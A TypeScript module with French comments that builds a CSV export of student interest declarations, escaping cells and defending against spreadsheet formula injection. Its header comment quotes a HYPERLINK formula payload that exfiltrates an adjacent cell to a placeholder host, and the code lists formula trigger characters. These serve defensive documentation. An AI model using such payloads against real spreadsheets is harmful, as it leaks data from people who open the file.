/**
 * Sérialisation CSV de la liste d'intérêt « Études en France ».
 *
 * ## Pourquoi ce fichier existe séparément
 *
 * Parce que l'échappement CSV a DEUX responsabilités qu'on confond souvent, et
 * qu'une seule des deux est un problème de format.
 *
 * **1. La grammaire CSV** (RFC 4180) : une cellule contenant une virgule, un
 * guillemet ou un retour à la ligne doit être entourée de guillemets, et ses
 * guillemets internes doublés. Sans ça, une filière saisie « Droit, économie »
 * décale toute la ligne d'une colonne — et la colonne « veut Premium » se lit
 * sur la mauvaise personne.
 *
 * **2. L'injection de formules**, qui n'est PAS un problème de format mais de
 * sécurité. Excel, LibreOffice et Google Sheets évaluent toute cellule qui
 * commence par `=`, `+`, `-`, `@`, ou par une tabulation / un retour chariot.
 * Un étudiant qui déclare son niveau comme
 * `=HYPERLINK("https://invalid.test?"&A1,"cliquez")` exfiltre la ligne d'à côté
 * vers un serveur tiers dès qu'un membre de l'équipe commerciale ouvre le
 * fichier et accepte l'invite. Les guillemets de la RFC 4180 n'y changent
 * RIEN : le tableur déguillemette avant d'évaluer.
 *
 * (`invalid.test` est un domaine RÉSERVÉ par la RFC 6761, jamais résolvable, et
 * c'est le placeholder que `privacy_disclosure_parity_test.dart` reconnaît déjà.
 * Ce n'est pas de la coquetterie : cette garde extrait tout `https://…` de
 * `backend/src` et exige que chaque hôte soit un processeur déclaré dans les
 * deux politiques de confidentialité. Un hôte d'exemple inventé ici la fait
 * échouer — mesuré, elle a échoué sur la première version de ce commentaire.)
 *
 * La neutralisation retenue est le préfixe apostrophe, qui force le tableur à
 * traiter la cellule comme du texte. On ne supprime pas le caractère : la
 * valeur reste lisible et honnête pour qui la relit, alors qu'un
 * caractère silencieusement retiré aurait fait mentir l'export.
 */

/** Caractères qui font évaluer une cellule comme une formule. */
const FORMULA_TRIGGERS = ['=', '+', '-', '@', '\t', '\r'];

/**
 * Une valeur prête pour une cellule CSV : neutralisée contre l'évaluation par
 * un tableur, puis échappée selon la RFC 4180.
 */
export function csvCell(value: unknown): string {
  // Cellule vide GUILLEMETÉE, pas de sortie anticipée à chaîne nue. Un champ
  // vide non guillemeté reste du CSV valide, mais il ferait de « toutes les
  // cellules sont guillemetées » une règle à trois exceptions — et c'est en
  // maintenant des règles à exceptions qu'on finit par oublier laquelle
  // s'applique. Le `String(value)` plus bas ne peut pas s'en charger : il
  // écrirait le texte « null » dans la cellule.
  if (value === null || value === undefined) return '""';

  let text = String(value);

  if (text.length > 0 && FORMULA_TRIGGERS.includes(text[0])) {
    text = `'${text}`;
  }

  // Toujours guillemeter : c'est plus court à lire qu'une condition, et ça ne
  // laisse aucun cas limite (virgule, point-virgule, saut de ligne) dépendre
  // d'un test qu'on aurait pu écrire trop étroit.
  return `"${text.replace(/"/g, '""')}"`;
}

/** Une ligne CSV, cellules déjà neutralisées et échappées. */
export function csvRow(values: readonly unknown[]): string {
  return values.map(csvCell).join(',');
}

/** Ce que l'équipe commerciale lit, colonne par colonne. */
export const EEF_INTEREST_CSV_HEADER = [
  'declared_at',
  'consented_at',
  'user_id',
  'full_name',
  'email',
  'phone',
  'whatsapp',
  'country_of_residence',
  'current_level',
  'target_level',
  'field_ids',
  'wants_premium',
  // Mineur, majeur, ou inconnu. Pas une date de naissance : la personne qui
  // décroche a besoin de savoir à qui elle parle, pas de connaître son âge exact.
  // Et « inconnu » est une valeur à part entière — l'écraser sur « non » ferait
  // passer pour majeur un profil dont on ignore simplement la date.
  'is_minor',
  'consent_version',
] as const;

export interface EefInterestCsvRow {
  createdAt: Date;
  consentedAt: Date;
  consentVersion: string | null;
  userId: string;
  currentLevel: string | null;
  targetLevel: string | null;
  fieldIds: string[] | null;
  wantsPremium: boolean;
  user: {
    fullName: string;
    email: string;
    phone: string;
    whatsApp: string | null;
    countryOfResidence: string;
    minority: 'minor' | 'adult' | 'unknown';
  } | null;
}

/** Ce que la colonne `is_minor` écrit, en français, pour un lecteur humain. */
const MINORITY_LABEL: Record<string, string> = {
  minor: 'oui',
  adult: 'non',
  unknown: 'inconnu',
};

/**
 * Le fichier complet, en-tête comprise.
 *
 * Le BOM UTF-8 en tête n'est pas de la superstition : sans lui, Excel sous
 * Windows lit le fichier en ANSI et « Côte d'Ivoire » arrive en « CÃ´te
 * d'Ivoire ». Le public de cet export est francophone — les accents sont la
 * règle, pas le cas limite.
 */
export function buildEefInterestCsv(
  rows: readonly EefInterestCsvRow[],
  options: { totalRows?: number | null; limit?: number } = {},
): string {
  const lines = [csvRow(EEF_INTEREST_CSV_HEADER)];

  for (const row of rows) {
    lines.push(
      csvRow([
        row.createdAt.toISOString(),
        row.consentedAt.toISOString(),
        row.userId,
        row.user?.fullName ?? '',
        row.user?.email ?? '',
        row.user?.phone ?? '',
        row.user?.whatsApp ?? '',
        row.user?.countryOfResidence ?? '',
        row.currentLevel ?? '',
        row.targetLevel ?? '',
        // `?? []` : la colonne est un `TEXT[]` nullable au niveau SQL, comme
        // tous les tableaux que Prisma génère. Inatteignable par le code
        // applicatif, atteignable par un backfill — et un `.join` sur `null`
        // aurait fait lever l'extraction en pleine génération, livrée ensuite
        // comme un fichier `.csv` contenant une erreur.
        (row.fieldIds ?? []).join(' | '),
        row.wantsPremium ? 'oui' : 'non',
        MINORITY_LABEL[row.user?.minority ?? 'unknown'] ?? 'inconnu',
        row.consentVersion ?? '',
      ]),
    );
  }

  // La troncature, ÉCRITE DANS LE FICHIER.
  //
  // Un plafond silencieux se lit comme une liste complète. À 25 000
  // déclarations, l'export rendait les 20 000 plus récentes et le tableau de
  // bord affichait 25 000 : les 5 000 plus anciens prospects disparaissaient
  // sans un mot. La ligne va dans le fichier et non dans un en-tête HTTP, parce
  // que c'est le fichier qu'on ouvre trois semaines plus tard.
  const { totalRows, limit } = options;
  if (typeof totalRows === 'number' && totalRows > rows.length) {
    lines.push(
      csvRow([
        `EXPORT TRONQUÉ — ${rows.length} lignes sur ${totalRows}. ` +
          `Plafond : ${limit ?? rows.length}. Les plus ANCIENNES manquent ` +
          `(tri par date décroissante).`,
      ]),
    );
  }

  return `﻿${lines.join('\r\n')}\r\n`;
}
